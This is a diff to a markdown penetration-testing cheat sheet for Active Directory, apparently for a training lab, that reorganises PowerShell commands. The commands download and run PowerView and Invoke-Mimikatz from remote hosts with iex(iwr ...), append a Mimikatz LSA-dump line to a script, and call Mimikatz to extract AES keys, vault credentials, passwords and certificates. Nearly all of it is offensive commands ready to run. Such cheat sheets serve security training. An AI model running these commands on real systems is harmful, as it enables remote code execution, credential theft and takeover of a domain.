@@ -57,12 +57,18 @@ Download
 ```powershell
 iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
 iex(iwr http://192.168.50.149/Invoke-Mimikatz.ps1)
-
+iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
 ```
 Run command
 ```cmd
 runas /user:[Domain]\[user] cmd
 ```
+
+Add content to file
+```powershell
+Add-Content IM.ps1 "Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::lsa /patch' "
+```
+
 
 ## Enumeration
 
@@ -230,14 +236,7 @@ Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
 
 #### Mimikatz
 
-Add content to file
-```powershell
-Add-Content IM.ps1 "Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::lsa /patch' "
-```
 
-```powershell
-iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
-```
 Get AES keys
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
@@ -246,7 +245,7 @@ Inspect credentials vault
 ```powershell
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
-
+Dump creds and certs
 ```powershell
 Invoke-Mimikatz -DumpCreds
 Invoke-Mimikatz -DumpCerts
